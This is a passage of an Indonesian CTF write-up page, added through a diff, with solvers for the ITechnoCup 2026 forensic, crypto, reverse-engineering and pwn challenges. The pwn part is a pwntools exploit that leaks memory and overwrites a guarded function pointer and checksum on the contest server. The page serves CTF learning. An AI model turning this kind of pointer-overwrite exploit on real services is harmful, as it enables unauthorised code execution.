@@ -1,0 +1,713 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ITechnoCup 2026 CTF Qualification | karashi</title>
+  <meta name="description" content="Writeup lengkap ITechnoCup 2026 CTF Penyisihan oleh Team BOEDOET AK DRAGON 47 — Forensic, Cryptography, Reverse Engineering, PWN, OSINT." />
+  <link rel="stylesheet" href="../style.css" />
+</head>
+<body>
+  <header class="titlebar">
+    <div class="titlebar-left">
+      <span class="term-dots">
+        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
+      </span>
+      <span class="titlebar-path">~/trace/writeups/itechnocup2026.md</span>
+    </div>
+    <nav class="nav">
+      <a class="wr-back" href="../index.html">← ~/trace</a>
+    </nav>
+  </header>
+
+  <main class="wr-shell">
+    <div class="wr-header">
+      <div class="wr-eyebrow">$ cat writeups/itechnocup2026.md</div>
+      <h1 class="wr-title">ITechnoCup 2026 CTF Qualification</h1>
+      <div class="wr-meta">
+        <span><strong>team</strong> BOEDOET AK DRAGON 47</span>
+        <span><strong>result</strong> Advance to the final</span>
+        <span><strong>date</strong> 2026-09-12</span>
+        <span><strong>players</strong> sinsrakzz · KiiOrg · HansRajin</span>
+      </div>
+    </div>
+
+    <nav class="wr-toc" aria-label="Daftar isi">
+      <div class="wr-toc-label">Daftar isi</div>
+      <ol>
+        <li><a href="#zippo">Forensic (Zippo)</a></li>
+        <li><a href="#pikachu">Cryptography (Pikachu)</a></li>
+        <li><a href="#vault">Reverse Engineering (ITECHNO_VAULT)</a></li>
+        <li><a href="#indonesia">PWN (Indonesia)</a></li>
+        <li><a href="#scroll">OSINT (Scroll)</a></li>
+        <li><a href="#rumus-kimia">OSINT (Rumus Kimia)</a></li>
+        <li><a href="#git-happens">OSINT(Git Happens)</a></li>
+      </ol>
+    </nav>
+
+    <!-- ============================== FORENSIC ============================== -->
+    <section class="wr-cat" id="forensic">
+      <h2 class="wr-cat-title">Forensic</h2>
+
+      <article class="wr-chal" id="zippo">
+        <h3 class="wr-chal-title">
+          <span class="level level-info">INFO</span> Zippo
+        </h3>
+        <div class="wr-body">
+          <p>Disini dikasih sebuah file berbentuk zip <code>challenge.zip</code>. Langkah awal yang saya lakukan ya cek tipe file dan unzip.</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar">
+            <span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span>
+          </div>
+          <pre>~/ctf/foren
+&gt; file challenge.zip
+&gt; unzip -l challenge.zip
+challenge.zip: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified May 30 2026 22:03:20, uncompressed size 48087, method=deflate
+Archive:  challenge.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+    48087  2026-05-30 22:03    flag.txt
+---------                     -------
+    48087                     1 file</pre>
+        </div>
+        <div class="wr-body">
+          <p>Di dalamnya ada file <code>flag.txt</code>. Saya extract, lalu cek jenis file dari <code>flag.txt</code> tersebut.</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar">
+            <span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span>
+          </div>
+          <pre>~/ctf/foren
+&gt; unzip -o challenge.zip
+Archive:  challenge.zip
+  inflating: flag.txt
+
+~/ctf/foren
+&gt; file flag.txt
+flag.txt: Zip archive, with extra data prepended</pre>
+        </div>
+        <div class="wr-body">
+          <p>Ternyata ini adalah sebuah arsip ZIP yang punya data ekstra di bagian dalamnya. Saat dilihat pakai <code>head -c 100 flag.txt</code>, isinya berupa data biner. Ketika saya coba extract lagi pakai <code>unzip -o flag.txt</code>, muncul peringatan sistem:</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar">
+            <span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span>
+          </div>
+          <pre>~/ctf/foren
+&gt; unzip -o flag.txt
+Archive:  flag.txt
+warning [flag.txt]:  728 extra bytes at beginning or within zipfile
+          (attempting to process anyway)
+  inflating: flag.txt
+flag.txt: Zip archive, with extra data prepended</pre>
+        </div>
+        <div class="wr-body">
+          <p>Tapi ekstrak tetap bisa dan menghasilkan file <code>flag.txt</code> lagi. Ini terjadi berulang-ulang terus, dan lapisan ZIP-nya berlapis-lapis jadi nggak mungkin diekstrak manual satu-satu.</p>
+          <p>Solver script yang saya minta ke ChatGPT model <strong>GPT-5.6 Luna</strong>:</p>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">python</span></div>
+          <pre>import zipfile
+from pathlib import Path
+
+cur = Path("flag.txt")
+layer = 0
+
+# Melakukan perulangan selama file saat ini masih merupakan format ZIP valid
+while zipfile.is_zipfile(cur):
+    with zipfile.ZipFile(cur) as z:
+        # Mengambil nama file pertama di dalam arsip
+        name = z.namelist()[0]
+        # Membaca isi data dari file tersebut
+        data = z.read(name)
+
+    layer += 1
+    cur = Path(f"layer_{layer}.bin")
+    cur.write_bytes(data)
+    print(f"[+] layer {layer}: {cur}")
+
+print("[+] Final Result:")
+print(cur.read_text(errors="replace"))</pre>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar">
+            <span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span>
+          </div>
+          <pre>[+] layer 61: layer_61.bin
+[+] layer 62: layer_62.bin
+[+] layer 63: layer_63.bin
+[+] layer 64: layer_64.bin
+[+] layer 65: layer_65.bin
+[+] final:
+ITECHNO26{z1pp0_m4st3r_unz1p_4ll_l4y3rs_67}</pre>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{z1pp0_m4st3r_unz1p_4ll_l4y3rs_67}
+        </div>
+      </article>
+    </section>
+
+    <!-- ============================== CRYPTOGRAPHY ============================== -->
+    <section class="wr-cat" id="cryptography">
+      <h2 class="wr-cat-title">Cryptography</h2>
+
+      <article class="wr-chal" id="pikachu">
+        <h3 class="wr-chal-title">
+          <span class="level level-warn">WARN</span> Pikachu
+        </h3>
+        <div class="wr-body">
+          <p>Dikasih 2 file: <code>chall.py</code> dan <code>output.txt</code>.</p>
+          <p>Dari <code>chall.py</code>, terlihat bahwa sebuah code menghasilkan key stretching lewat PBKDF2-HMAC-SHA256, lalu hasil stretched-nya dipakai untuk menurunkan dua seed (<code>sk_seed</code> dan <code>pub_seed</code>) lewat SHA3-256 dengan domain separator <code>"PikaSPX|sk-seed|"</code> dan <code>"PikaSPX|pub-seed|"</code>.</p>
+          <p><code>tree_height = 4</code>, dibuat sebanyak 2⁴ = 16 leaf yang digabung untuk menghasilkan Merkle root. Flag dienkripsi menggunakan ciphertext berbasis SHAKE-256 sebagai XOR stream.</p>
+          <p>Di <code>output.txt</code> ada parameter <code>code_bits = 22</code> — kalau dijumlah, angkanya kecil di dunia komputasi dan sangat mungkin di-solve pakai teknik brute force. Di <code>chall.py</code> juga ada hint:</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>print("Recompute the published root for every candidate code until it matches.")</pre>
+        </div>
+        <div class="wr-body">
+          <p>Artinya kita nggak perlu membalikkan fungsi PBKDF2 atau cari kelemahan SHA256/3 cukup coba kemungkinan <code>code</code> dan menghitung root yang dihasilkan, lalu bandingkan ke root yang dipublikasikan.</p>
+          <p>Saya minta ChatGPT model <strong>GPT-5.6 Luna</strong> membuatkan solver brute force multiprocessing:</p>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">python</span></div>
+          <pre>import ast
+import hashlib
+import os
+import time
+from concurrent.futures import ProcessPoolExecutor, as_completed
+
+# ============================================================
+# Load output
+# ============================================================
+with open("output.txt") as f:
+    public = {}
+    for line in f:
+        if not line.strip():
+            continue
+        key, value = line.split("=", 1)
+        public[key.strip()] = ast.literal_eval(value.strip())
+
+CODE_BITS = int(public["code_bits"])
+ROUNDS = int(public["pbkdf2_rounds"])
+HEIGHT = int(public["tree_height"])
+SALT = bytes.fromhex(public["salt"])
+TARGET_ROOT = bytes.fromhex(public["root"])
+NONCE = bytes.fromhex(public["nonce"])
+CT = bytes.fromhex(public["ct"])
+
+CODE_SPACE = 1 &lt;&lt; CODE_BITS
+LEAF_COUNT = 1 &lt;&lt; HEIGHT
+
+# ============================================================
+# Crypto
+# ============================================================
+def derive_root(code):
+    code_bytes = code.to_bytes(3, "little")
+    stretched = hashlib.pbkdf2_hmac("sha256", code_bytes, SALT, ROUNDS, 32)
+
+    sk_seed = hashlib.sha3_256(b"PikaSPX|sk-seed|" + stretched).digest()
+    pub_seed = hashlib.sha3_256(b"PikaSPX|pub-seed|" + stretched).digest()
+
+    nodes = []
+    for index in range(LEAF_COUNT):
+        idx = index.to_bytes(2, "little")
+        leaf_secret = hashlib.sha3_256(
+            b"PikaSPX|leaf-secret|" + sk_seed + idx
+        ).digest()
+        leaf = hashlib.sha3_256(
+            b"PikaSPX|leaf-pk|" + pub_seed + idx + leaf_secret
+        ).digest()
+        nodes.append(leaf)
+
+    while len(nodes) &gt; 1:
+        nodes = [
+            hashlib.sha3_256(b"PikaSPX|node|" + nodes[i] + nodes[i + 1]).digest()
+            for i in range(0, len(nodes), 2)
+        ]
+    return nodes[0]
+
+# ============================================================
+# Search worker
+# ============================================================
+def search_chunk(args):
+    start, end = args
+    for code in range(start, end):
+        if derive_root(code) == TARGET_ROOT:
+            return code
+    return None
+
+# ============================================================
+# Decrypt
+# ============================================================
+def decrypt(code):
+    code_bytes = code.to_bytes(3, "little")
+    stretched = hashlib.pbkdf2_hmac("sha256", code_bytes, SALT, ROUNDS, 32)
+    key = hashlib.sha3_256(b"PikaSPX|flag-key|" + stretched + TARGET_ROOT).digest()
+    stream = hashlib.shake_256(key + NONCE).digest(len(CT))
+    return bytes(a ^ b for a, b in zip(CT, stream))
+
+# ============================================================
+# Main
+# ============================================================
+if __name__ == "__main__":
+    workers = min(os.cpu_count() or 1, 8)
+    chunk_size = 8192
+    chunks = [
+        (start, min(start + chunk_size, CODE_SPACE))
+        for start in range(0, CODE_SPACE, chunk_size)
+    ]
+
+    print(f"[+] Code space : {CODE_SPACE:,}")
+    print(f"[+] PBKDF2     : {ROUNDS}")
+    print(f"[+] Leaves     : {LEAF_COUNT}")
+    print(f"[+] Workers    : {workers}")
+    print(f"[+] Chunks     : {len(chunks)}")
+    print("[+] Searching...")
+
+    found = None
+    with ProcessPoolExecutor(max_workers=workers) as pool:
+        futures = {pool.submit(search_chunk, c): c for c in chunks}
+        for future in as_completed(futures):
+            result = future.result()
+            if result is not None:
+                found = result
+                for f in futures:
+                    if not f.done():
+                        f.cancel()
+                break
+
+    if found is None:
+        raise SystemExit("[-] Code not found.")
+
+    flag = decrypt(found)
+    print(f"[+] code = {found} (hex={found:#x})")
+    print("[+] FLAG:", flag.decode())</pre>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>~/ctf/cripto via ⚡ v3.14.7
+&gt; python3 solve.py
+[+] Code space : 4,194,304
+[+] PBKDF2     : 1710
+[+] Leaves     : 16
+[+] Workers    : 8
+[+] Chunks     : 512
+
+[+] Searching...
+[*]  87.89% | 450/512 chunks | 418.0s
+
+========================================================
+[+] CODE FOUND!
+========================================================
+[+] code = 3700379
+[+] hex  = 0x38769b
+
+========================================================
+[+] FLAG
+========================================================
+ITECHNO26{p1k4Chu_l00ks_ador4ble_4nd_i_L0VE_pik4chu}</pre>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{p1k4Chu_l00ks_ador4ble_4nd_i_L0VE_pik4chu}
+        </div>
+      </article>
+    </section>
+
+    <!-- ============================== REVERSE ENGINEERING ============================== -->
+    <section class="wr-cat" id="reverse-engineering">
+      <h2 class="wr-cat-title">Reverse Engineering</h2>
+
+      <article class="wr-chal" id="vault">
+        <h3 class="wr-chal-title">
+          <span class="level level-crit">CRIT</span> ITECHNO_VAULT
+        </h3>
+        <div class="wr-body">
+          <p>Binary-nya ngecek kode format <code>ITECHNO26{...}</code> pakai hash custom yang kalau diitung manual lumayan ribet. Daripada capek-capek nulis ulang logikanya di Python (dan resiko typo di tengah jalan), saya langsung comot byte mesin asli dari file exe, suntik ke memori yang executable, terus panggil langsung fungsinya sebagai "oracle" buat brute-force. 8 chunk, brute-force paralel, kelar kurang dari semenit.</p>
+
+          <p><strong>1. Kenalan dulu sama binary-nya.</strong> Cek dulu ini file jenis apaan ternyata PE32+ (exe Windows) 64-bit, dan udah di-strip simbolnya.</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>$ file itechno_vault.exe
+itechno_vault.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 10 sections</pre>
+        </div>
+        <div class="wr-body">
+          <p><code>strings</code> nemu beberapa potongan teks yang kasih clue soal alurnya: minta satu baris input ("incident code") yang harus divalidasi sesuai format <code>ITECHNO26{...}</code> standar keygen.</p>
+
+          <p><strong>2. Bedah alur validasinya.</strong> Karena stripped, saya cari lokasi fungsi validasi dengan nge-track balik alamat string tadi (pakai <code>objdump</code> + <code>strings -t x</code> buat dapetin file offset, dikonversi ke virtual address biar ketemu instruksi <code>lea</code> yang makai string itu). Alurnya kira-kira:</p>
+          <p>Panjang input harus pas 51 karakter, 10 karakter pertama harus persis <code>"ITECHNO26{"</code>, karakter terakhir harus <code>"}"</code>, dan 40 karakter di tengah (isi flag) dicek lebih detail.</p>
+          <p>Ada beberapa lapis pengecekan: charset check (lowercase a-z, angka, underscore saja), lalu sebuah VM bytecode interpreter custom yang terlihat serem (pakai magic constant seperti <code>0x9e3779b9</code>) tapi ternyata cuma <em>decoy</em> hasilnya selalu sukses dan buffernya nggak pernah dipakai lagi. Validasi asli: 40 karakter dipecah jadi 8 chunk @ 5 karakter, tiap chunk dicek independen lewat S-box custom (XOR + rotate) → hash mixing mirip finalizer MurmurHash3 → dibandingkan ke nilai target di data section.</p>
+
+          <p><strong>3. Kenapa brute-force, bukan ngitung manual.</strong> Hash function-nya gabungan XOR + perkalian modular + shift berlapis bisa aja dibalik secara aljabar tapi effort-nya gede dan gampang salah. Untungnya tiap chunk cuma 5 karakter dengan charset <code>[a-z0-9_]</code> (37 karakter), jadi ruang pencarian per chunk cuma 37⁵ ≈ 69 juta kombinasi kecil, asal punya cara ngecek yang cepat dan akurat.</p>
+          <p>Triknya: comot byte <code>.text</code> dan <code>.rdata</code> dari exe apa adanya, suntikkan ke memori RWX, lalu panggil langsung fungsi validasinya sebagai oracle 100% akurat karena itu kode mesin persis yang bakal dijalankan Windows. Ini bisa jalan karena fungsi validasi per-chunk itu self-contained (nggak manggil CRT/WinAPI apa pun, cuma baca tabel data lewat alamat RIP-relative), jadi bisa dieksekusi di base address berapa aja termasuk di Linux, asal jembatan calling convention RCX/RDX (Windows) ↔ RDI/RSI (Linux) dijembatani.</p>
+
+          <p><strong>4. Script solver</strong> (dibuat dengan bantuan Claude model Sonnet 5)3 file: <code>extract.py</code> motong section dari exe, <code>stub.s</code> jembatan calling convention, <code>brute.c</code> harness brute-force.</p>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">extract.py</span></div>
+          <pre>data = open("itechno_vault.exe", "rb").read()
+TEXT_VA, TEXT_FOFF, TEXT_SIZE = 0x140001000, 0x400, 0x2098
+RDATA_VA, RDATA_FOFF, RDATA_SIZE = 0x140005000, 0x2800, 0xef0
+
+text = data[TEXT_FOFF:TEXT_FOFF+TEXT_SIZE]
+rdata = data[RDATA_FOFF:RDATA_FOFF+RDATA_SIZE]
+
+open("text.bin", "wb").write(text)
+open("rdata.bin", "wb").write(rdata)</pre>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">stub.s — System V → Windows x64</span></div>
+          <pre>.intel_syntax noprefix
+.text
+.global call_win64
+# argumen System V masuk: rdi=alamat fungsi, rsi=win_rcx(arg1), rdx=win_rdx(arg2)
+call_win64:
+    push rbx
+    sub rsp, 0x28        # 32-byte shadow space (+ jaga alignment 16-byte)
+    mov rcx, rsi          # arg1 -> RCX (Windows ABI)
+    # rdx udah pas isinya buat arg2 Windows ABI
+    call rdi
+    add rsp, 0x28
+    pop rbx
+    ret</pre>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">brute.c</span></div>
+          <pre>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;stdint.h&gt;
+
+extern int call_win64(void* func, uint64_t rcx, uint64_t rdx);
+
+#define TEXT_VA    0x140001000ULL
+#define RDATA_VA   0x140005000ULL
+#define TEXT_SIZE  0x2098
+#define RDATA_SIZE 0xef0
+#define BUF_SIZE   (RDATA_VA - TEXT_VA + RDATA_SIZE)
+#define FUNC_OFF   (0x140002700ULL - TEXT_VA)  // fungsi validasi per-chunk
+
+int main(int argc, char** argv) {
+    if (argc &lt; 2) { fprintf(stderr, "usage: %s &lt;chunk_index 0-7&gt;\n", argv[0]); return 1; }
+    int idx = atoi(argv[1]);
+
+    FILE* ft = fopen("text.bin", "rb");
+    FILE* fr = fopen("rdata.bin", "rb");
+    unsigned char* tbuf = malloc(TEXT_SIZE);
+    unsigned char* rbuf = malloc(RDATA_SIZE);
+    fread(tbuf, 1, TEXT_SIZE, ft);
+    fread(rbuf, 1, RDATA_SIZE, fr);
+    fclose(ft); fclose(fr);
+
+    void* mem = mmap(NULL, BUF_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC,
+                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    if (mem == MAP_FAILED) { perror("mmap"); return 1; }
+    memset(mem, 0, BUF_SIZE);
+    memcpy(mem, tbuf, TEXT_SIZE);
+    memcpy((char*)mem + (RDATA_VA - TEXT_VA), rbuf, RDATA_SIZE);
+
+    void* func = (char*)mem + FUNC_OFF;
+    const char* alphabet = "abcdefghijklmnopqrstuvwxyz0123456789_";
+    int alen = strlen(alphabet);
+    char chunk[8];
+    long long total = 0;
+
+    for (int a=0;a&lt;alen;a++)
+    for (int b=0;b&lt;alen;b++)
+    for (int c=0;c&lt;alen;c++)
+    for (int d=0;d&lt;alen;d++)
+    for (int e=0;e&lt;alen;e++) {
+        chunk[0]=alphabet[a]; chunk[1]=alphabet[b]; chunk[2]=alphabet[c];
+        chunk[3]=alphabet[d]; chunk[4]=alphabet[e];
+        chunk[5]=chunk[6]=chunk[7]=0;
+        uint64_t rcx = (uint64_t)(uintptr_t)chunk;
+        int r = call_win64(func, rcx, (uint64_t)idx);
+        total++;
+        if (r) {
+            printf("FOUND idx=%d chunk=%.5s\n", idx, chunk);
+            fflush(stdout);
+        }
+    }
+    fprintf(stderr, "idx=%d done, tried=%lld\n", idx, total);
+    return 0;
+}</pre>
+        </div>
+        <div class="wr-body">
+          <p><strong>Build &amp; run:</strong></p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>python3 extract.py
+gcc -O2 -o brute brute.c stub.s
+
+# jalanin ke-8 chunk sekaligus paralel biar cepet
+for i in 0 1 2 3 4 5 6 7; do
+  ./brute $i &gt; out_$i.log 2&gt;&amp;1 &amp;
+done
+wait
+cat out_*.log</pre>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>FOUND idx=0 chunk=n0rm4
+FOUND idx=1 chunk=l_r3v
+FOUND idx=2 chunk=3rs3r
+FOUND idx=3 chunk=_c4n_
+FOUND idx=4 chunk=easy_
+FOUND idx=5 chunk=s0lv3
+FOUND idx=6 chunk=_th1s
+FOUND idx=7 chunk=_sh1t
+
+[*] Menyusun flag...
+FLAG: ITECHNO26{n0rm4l_r3v3rs3r_c4n_easy_s0lv3_th1s_sh1t}</pre>
+        </div>
+        <div class="wr-body">
+          <p>Sekitar 29 detik per chunk (69,3 juta percobaan), dan karena ke-8nya dijalankan paralel, total kelar kurang dari semenit. Enaknya lagi, tiap index cuma nemu tepat satu kecocokan hash-nya emang didesain unik buat brute-force sekecil ini, nggak ada collision yang bikin bingung.</p>
+          <p><strong>5. Rakit flag-nya:</strong></p>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">python</span></div>
+          <pre>chunks = ['n0rm4','l_r3v','3rs3r','_c4n_','easy_','s0lv3','_th1s','_sh1t']
+flag = 'ITECHNO26{' + ''.join(chunks) + '}'
+# ITECHNO26{n0rm4l_r3v3rs3r_c4n_easy_s0lv3_th1s_sh1t}
+# panjangnya 51 karakter pas sama cek panjang di awal (0x33)</pre>
+        </div>
+        <div class="wr-body">
+          <p>Sempat coba verifikasi ulang lewat fungsi validasi "top-level"-nya juga (bukan cuma per-chunk), tapi ternyata itu manggil <code>strlen</code> lewat import thunk ke <code>msvcrt.dll</code> yang jelas nggak ada pas dijalankan di Linux, jadi langsung crash. Tapi santai itu di luar jalur logika validasi inti; fungsi per-chunk yang jadi sumber kebenaran udah fully self-contained dan udah dieksekusi sebagai kode mesin asli, jadi hasilnya tetap valid.</p>
+        </div>
+        <div class="wr-flag">
+          <span class="wr-flag-label">Flag</span>
+          ITECHNO26{n0rm4l_r3v3rs3r_c4n_easy_s0lv3_th1s_sh1t}
+        </div>
+      </article>
+    </section>
+
+    <!-- ============================== PWN ============================== -->
+    <section class="wr-cat" id="pwn">
+      <h2 class="wr-cat-title">PWN</h2>
+
+      <article class="wr-chal" id="indonesia">
+        <h3 class="wr-chal-title">
+          <span class="level level-crit">CRIT</span> Indonesia
+        </h3>
+        <div class="wr-body">
+          <p>Dikasih file <code>Indonesia</code>, yang kalau dicek tipe file-nya merupakan binary ELF (x86-64, PIE, stripped), jalan lewat <code>nc ctf.itechnocup.id 39994</code>.</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>~/ctf/pwn via ⚡ v3.14.7
+&gt; file indonesia
+indonesia: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked,
+interpreter /lib64/ld-linux-x86-64.so.2, stripped
+
+&gt; ./indonesia
+Indonesia - layanan arsip digital
+menu:
+  bantuan            tampilkan menu
+  katalog            lihat metadata arsip
+  baca &lt;off&gt; &lt;len&gt;    baca potongan dokumen
+  tulis &lt;off&gt; &lt;byte&gt;  jalur tulis biasa
+  pinjam &lt;off&gt;       pinjam satu halaman arsip
+  cap &lt;kode&gt;         beri cap pada halaman pinjaman
+  tampil &lt;idx&gt;       jalankan loket layanan 0 atau 1
+  keluar             selesai
+indonesia&gt;</pre>
+        </div>
+        <div class="wr-body">
+          <p>Dari analisis dengan radare2 (<code>r2 -A</code>) dan <code>objdump</code>: program simpan dokumen sepanjang <code>0x600</code> byte di memori. Di dalamnya ada area khusus di offset <code>0x3a0</code> sepanjang 24 byte, disebut "area segel", yang bisa dikonfirmasi lewat command <code>katalog</code>:</p>
+        </div>
+        <div class="wr-term">
+          <div class="wr-term-bar"><span class="term-dots small"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span></span></div>
+          <pre>indonesia&gt; katalog
+doc_size=0x600 seal_off=0x3a0 seal_len=0x18 batas_cap=0x30
+catatan: dokumen tersegel melewati audit sebelum loket dijalankan.</pre>
+        </div>
+        <div class="wr-body">
+          <p>Isi area segel: <code>+0x3a0 loket[0]</code>, <code>+0x3a8 loket[1]</code>, <code>+0x3b0 checksum</code>. Command <code>tampil &lt;idx&gt;</code> pada dasarnya memanggil fungsi lewat pointer yang disimpan di area ini tapi sebelum memanggil, dia cek ulang <code>hash(loket[0], loket[1])</code> dan membandingkannya dengan checksum tersimpan.</p>
+          <p>Analisis lebih lanjut menemukan fungsi tak terpakai di alamat <code>0x1ac0</code> tidak ada satu pun referensi statis ke fungsi ini di mana pun dalam binary. Isinya intinya: decode nama file <code>flag.txt</code>, <code>fopen</code>, <code>fgets</code>, lalu <code>printf</code> isinya. Fungsi ini sengaja ditinggal satu-satunya cara manggilnya adalah dengan mengarahkan <code>loket[0]</code> atau <code>loket[1]</code> ke alamat ini.</p>
+          <p>Command <code>tulis &lt;off&gt; &lt;byte&gt;</code> secara eksplisit menolak menulis ke area segel (<code>if ((off - 0x3a0) &lt;= 0x17) puts("tulis: area segel ditolak");</code>). Tapi command <code>baca &lt;off&gt; &lt;len&gt;</code> tidak punya pengecualian yang sama cuma cek batas dokumen (<code>off+len &lt;= 0x600</code>) artinya kita bisa membaca isi <code>loket[0]</code>, <code>loket[1]</code>, dan <code>checksum</code> kapan saja.</p>
+          <p>Jalur <code>pinjam &lt;off&gt;</code> lalu <code>cap &lt;kode&gt;</code> tidak dibatasi sama sekali. Byte yang benar-benar ditulis adalah hasil fungsi hash 32-bit dari <code>(kode, off, counter_global, byte_lama)</code>, bukan kode itu sendiri secara langsung. Jalur ini tidak punya pengecekan terhadap area segel, padahal <code>tulis</code> punya. Karena fungsi hash-nya deterministik dan sepenuhnya bisa dihitung ulang offline (<code>off</code> kita tentukan, <code>counter</code> dibocorkan langsung lewat pesan "pinjam: antrean N siap", <code>byte_lama</code> bisa dibaca via bug <code>baca</code>), kita bisa brute-force <code>kode</code> (0–65535, rata-rata ~256 percobaan per byte) untuk menghasilkan byte target apa pun yang kita mau.</p>
+          <p>Kombinasi dua bug ini berarti kita bisa: bocorkan alamat fungsi, lalu timpa <code>loket[0]</code> byte-per-byte menjadi alamat fungsi <code>0x1ac0</code>, timpa <code>checksum</code> byte-per-byte agar tetap konsisten, lalu panggil <code>tampil 0</code> untuk memicu eksekusi fungsi pembaca <code>flag.txt</code>.</p>
+          <p>Script solver berikut dibuat dengan bantuan Claude model Sonnet 5:</p>
+        </div>
+        <div class="wr-code">
+          <div class="wr-term-bar"><span class="lang">python — pwntools</span></div>
+          <pre>#!/usr/bin/env python3
+"""
+Indonesia (pwn) - ITECHNO CTF 2026
+-----------------------------------
+`baca` bisa membaca bebas area segel (leak loket[0]/loket[1]/checksum + PIE base).
+`pinjam`+`cap` adalah jalur tulis byte-per-byte yang TIDAK dicek terhadap area
+segel, dengan byte hasil = hash(kode, off, counter, byte_lama). Karena semua
+variabel selain `kode` bisa kita ketahui/leak, brute-force kode 16-bit
+(~256 percobaan rata-rata) cukup untuk menulis byte target apa pun.
+
+Overwrite loket[0] -> alamat fungsi dead-code pembaca flag.txt, patch checksum
+supaya tetap valid, lalu panggil `tampil 0`.
+"""
+from pwn import *
+import sys, re, struct
+
+context.log_level = 'info'
+HOST = sys.argv[1] if len(sys.argv) &gt; 1 else 'ctf.itechnocup.id'
+PORT = int(sys.argv[2]) if len(sys.argv) &gt; 2 else 39994
+
+FLAG_FUNC_OFFSET   = 0x1ac0
+LOKET0_CODE_OFFSET = 0x1a20   # fcn awal loket[0]
+SEAL_OFF, LOKET0_OFF, LOKET1_OFF, CHECKSUM_OFF = 0x3a0, 0x3a0, 0x3a8, 0x3b0
+
+def xtea_hash(a, b):
+    # reimplementasi hash checksum area segel (XTEA-like, 64-bit)
+    ...
+
+def cap_byte(kode, off, counter, orig_byte):
+    # reimplementasi fungsi hash 32-bit di balik command `cap`
+    ...
+
+def find_kode(off, counter, orig_byte, target_byte):
+    for kode in range(0x10000):
+        if cap_byte(kode, off, counter, orig_byte) == target_byte:
+            return kode
+    raise Exception("kode tidak ditemukan")
+
+def recv_prompt(io):
+    return io.recvuntil(b'indonesia&gt; ').decode(errors='replace')
+
+def do_baca(io, off, length):
+    io.sendline(f'baca {off} {length}'.encode())
+    line = recv_prompt(io).splitlines()[0].strip()
+    return bytes.fromhex(line)
+
+def do_pinjam(io, off):
+    io.sendline(f'pinjam {off}'.encode())
+    m = re.search(r'antrean (\d+) siap', recv_prompt(io))
+    return int(m.group(1))
+
+def do_cap(io, kode):
+    io.sendline(f'cap {kode}'.encode())
+    recv_prompt(io)
+
+def write_bytes(io, off, orig_bytes, target_bytes):
+    for i, (ob, tb) in enumerate(zip(orig_bytes, target_bytes)):
+        counter = do_pinjam(io, off + i)
+        kode = find_kode(off + i, counter, ob, tb)
+        do_cap(io, kode)
+
+def main():
+    io = remote(HOST, PORT)
+    recv_prompt(io)
+
+    leak = do_baca(io, SEAL_OFF, 16)
+    loket0, loket1 = struct.unpack('&lt;QQ', leak)
+    old_checksum = struct.unpack('&lt;Q', do_baca(io, CHECKSUM_OFF, 8))[0]
+
+    base = loket0 - LOKET0_CODE_OFFSET
+    flag_func = base + FLAG_FUNC_OFFSET
+    new_checksum = xtea_hash(flag_func, loket1)
+
+    log.info(f"PIE base = {base:#x}, flag() target = {flag_func:#x}")
+
+    write_bytes(io, LOKET0_OFF, struct.pack('&lt;Q', loket0), struct.pack('&lt;Q', flag_func))
+    write_bytes(io, CHECKSUM_OFF, struct.pack('&lt;Q', old_checksum), struct.pack('&lt;Q', new_checksum))
+
+    io.sendline(b'tampil 0')
+    out = io.recvall(timeout=5).decode(errors='replace')
+    print(out)
+
+    m = re.search(r'ITECHNO26\{[^}]*\}', out)
+    if m:
+        log.success(f"FLAG: {m.group(0)}")
+    io.close()
+
